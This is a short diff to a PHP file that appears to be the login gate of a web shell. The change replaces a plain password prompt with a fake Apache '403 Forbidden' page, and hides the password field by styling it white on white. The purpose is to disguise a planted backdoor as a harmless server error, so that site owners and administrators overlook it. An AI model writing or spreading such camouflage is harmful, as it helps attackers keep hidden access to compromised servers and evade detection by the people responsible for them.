@@ -10,7 +10,20 @@ if(!empty($password) and $_SESSION[$sessioncode] != $password){
         $_SESSION[$sessioncode] = $password;
     }
     else {
-        print "<pre align=center><font>
+        print "
+<html><head>
+<title>403 Forbidden</title>
+</head>
+<body><h1>Forbidden</h1>
+<p>You don't have permission to access this page on this server.</p>
+<hr>
+<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80 </address>
+<style>
+input { margin:0;background-color:#fff;border:1px solid #fff; }
+</style>
+<center>
+</body>
+<pre align=center><font>
 </font><form method=post> <input type='password' name='pass'></form></pre>";
         exit;        
     }
